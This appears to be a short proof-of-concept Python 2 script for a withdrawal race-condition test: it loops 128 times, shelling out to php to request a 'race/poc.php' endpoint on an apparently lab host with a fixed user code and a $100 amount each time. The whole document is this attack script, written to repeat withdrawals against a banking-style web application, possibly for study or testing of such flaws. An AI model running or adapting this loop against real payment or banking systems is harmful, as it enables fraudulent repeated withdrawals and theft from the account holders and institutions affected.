import os
# Withdraw 128 times sequentially, $100 each time.
for i in xrange(0,128):
	print os.popen('php -r ' + \
                '"echo file_get_contents(\'http://domain1.sec/race/poc.php?user_code=BANK000001&amount=100\');"').read()
